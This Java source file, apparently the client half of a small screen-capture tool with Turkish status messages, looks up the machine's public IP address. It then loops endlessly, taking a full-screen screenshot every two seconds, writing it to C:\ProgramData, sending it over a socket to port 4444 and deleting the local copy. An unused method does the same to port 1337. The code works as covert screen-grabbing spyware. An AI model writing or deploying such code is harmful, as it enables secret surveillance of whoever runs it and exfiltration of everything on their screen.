import javax.imageio.*;
import javax.swing.*;
import java.awt.*;
import java.awt.image.*;
import java.io.*;
import java.net.*;
import java.util.concurrent.TimeUnit;

public class client_main{
    public static int shoots = 0;
    public static int shootssent=0;
    public static int a = 1;
    public static String yol="C:\\ProgramData\\" + shoots +".jpg";

    public static void screenshot() {

        String systemipaddress = "";
        try
        {
            URL url_name = new URL("http://bot.whatismyipaddress.com");

            BufferedReader sc =
                    new BufferedReader(new InputStreamReader(url_name.openStream()));

            // reads system IPAddress
            systemipaddress = sc.readLine().trim();
        }
        catch (Exception e)
        {
            systemipaddress = "Cannot Execute Properly";
        }
        System.out.println("Public IP Address: " + systemipaddress +"\n");

        for (int b =0; ; b++) {
            try {
                Robot robot = new Robot();
                String fileName = yol;

                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit()
                        .getScreenSize());
                BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
                ImageIO.write(screenFullImage, "jpg", new File(fileName));
                screenFullImage.flush();
                TimeUnit.SECONDS.sleep(2);
            } catch (Exception e) {
            }


            try {
                Socket socket = null;
                FileInputStream fis = null;
                BufferedInputStream bis = null;
                OutputStream out = null;
                socket = new Socket("127.0.0.1", 4444);
                System.out.println("Connecting....");
                File myFile = new File(yol);

                byte[] bytearray = new byte[(int) myFile.length()];
                fis = new FileInputStream(myFile);
                bis = new BufferedInputStream(fis);
                bis.read(bytearray, 0, bytearray.length);
                out = socket.getOutputStream();
                out.write(bytearray, 0, bytearray.length);
                out.flush();
                System.out.println("Done!");
                System.out.println(a + " done!");
                a++;
                socket.close();

                if (bis != null) bis.close();
                if (out != null) out.close();
                if (socket != null) socket.close();
                String path = myFile.getCanonicalPath();
                File filePath = new File(path);
                filePath.delete();
                System.out.println("dosya "+shoots+" silindi!");
                shoots++;

            } catch (Exception e) {
                System.out.println("bekliyorum");
            }
        }
    }



    public static void soket(){
        Socket socket = null;
        FileInputStream fis = null;
        BufferedInputStream bis = null;
        OutputStream out = null;
        int a = 1;
        while (true) {
            try {

                socket = new Socket("127.0.0.1", 1337);
                System.out.println("Connecting....");
                File myFile = new File(yol);
                byte[] bytearray = new byte[(int) myFile.length()];
                fis = new FileInputStream(myFile);
                bis = new BufferedInputStream(fis);
                bis.read(bytearray, 0, bytearray.length);
                out = socket.getOutputStream();
                out.write(bytearray, 0, bytearray.length);
                out.flush();
                System.out.println("Done!");
                TimeUnit.SECONDS.sleep(1);
                System.out.println(a + " bitti");
                a++;
                socket.close();

                if (bis != null) bis.close();
                if (out != null) out.close();
                if (socket != null) socket.close();



            } catch (Exception e) {

            }
        }
    }


    public static void main(String[] args)  {
        screenshot();
        //soket();
    }
}

